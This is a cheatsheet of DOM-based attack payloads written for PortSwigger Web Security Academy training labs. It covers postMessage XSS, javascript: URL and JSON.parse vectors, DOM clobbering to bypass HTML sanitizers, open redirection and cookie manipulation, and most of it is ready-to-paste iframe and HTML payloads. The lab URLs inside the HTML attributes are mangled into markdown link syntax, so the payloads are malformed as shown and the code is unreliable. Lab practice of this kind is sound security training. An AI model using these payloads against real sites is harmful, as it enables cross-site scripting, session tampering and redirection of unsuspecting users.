# 🧩 DOM-Based Vulnerabilities Cheatsheet

Complete methodology, exploitation vectors, and payloads for DOM XSS (Web Messages, JSON.parse, JavaScript URLs), DOM Clobbering, DOM Open Redirection, and DOM Cookie Manipulation labs tested in PortSwigger Web Security Academy.

---

## 📌 Core Mechanisms & Concepts

* **Sources:** Untrusted inputs controlling DOM data (e.g., `location.search`, `window.addEventListener('message')`, `document.cookie`).
* **Sinks:** Execution contexts or DOM elements that execute or render code/redirects (e.g., `innerHTML`, `location.href`, `eval()`, `element.src`).

---

## 🛠️ Detailed Breakdown & Payloads

### 1. Web Messages Vectors

**DOM XSS using web messages**
The application listens for postMessage events without validating the origin or sanitizing the payload before writing to `innerHTML`:

```html
<iframe src="[https://YOUR-LAB-ID.web-security-academy.net/](https://YOUR-LAB-ID.web-security-academy.net/)" onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')"></iframe>
```

**DOM XSS using web messages and a JavaScript URL**
The web message handler uses `indexOf('http://')` or `indexOf('https://')` to validate URLs, allowing bypasses via `javascript:print()//http://`:

```html
<iframe src="[https://YOUR-LAB-ID.web-security-academy.net/](https://YOUR-LAB-ID.web-security-academy.net/)" onload="this.contentWindow.postMessage('javascript:print()//http://','*')"></iframe>
```

**DOM XSS using web messages and JSON.parse**
The message event handler parses the message string using `JSON.parse()` and dynamically injects the parsed object property into a sink:

```html
<iframe src="[https://YOUR-LAB-ID.web-security-academy.net/](https://YOUR-LAB-ID.web-security-academy.net/)" onload="this.contentWindow.postMessage('{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}','*')"></iframe>
```

---

### 2. DOM Clobbering

**Exploiting DOM clobbering to enable XSS**
Overwriting global JavaScript variables or object properties using HTML elements with `id` or `name` attributes (e.g., clobbering `window.defaultAvatar` via `id="defaultAvatar"`):

```html
<a id="defaultAvatar" href="cid:&quot;onload=&quot;print()"></a>
```

**Clobbering DOM attributes to bypass HTML filters**
Clobbering `attributes` property on HTML elements using an `id="attributes"` input field to bypass HTML sanitizers like DOMPurify or custom filters:

```html
<form id="x" tabindex="0" onfocus="print()"><input id="attributes"></form>
<iframe src="[https://YOUR-LAB-ID.web-security-academy.net/post?postId=1](https://YOUR-LAB-ID.web-security-academy.net/post?postId=1)" onload="setTimeout(() => { this.src='[https://YOUR-LAB-ID.web-security-academy.net/post?postId=1#x](https://YOUR-LAB-ID.web-security-academy.net/post?postId=1#x)'; }, 500)"></iframe>
```

---

### 3. Open Redirection & Cookie Manipulation

**DOM-based open redirection**
The client-side code reads a parameter from `location.search` or `location.hash` and passes it directly to a redirection sink like `location.href`:

```html
[https://YOUR-LAB-ID.web-security-academy.net/post?postId=1&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/](https://YOUR-LAB-ID.web-security-academy.net/post?postId=1&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/)
```

**DOM-based cookie manipulation**
The script reads data from an unverified source (e.g., `location.search`) and writes it directly into `document.cookie`, leading to session cookie override or downstream client-side vulnerabilities:

```html
<iframe src="[https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&cookie=lastViewedProduct=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/](https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&cookie=lastViewedProduct=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/)"></iframe>
```
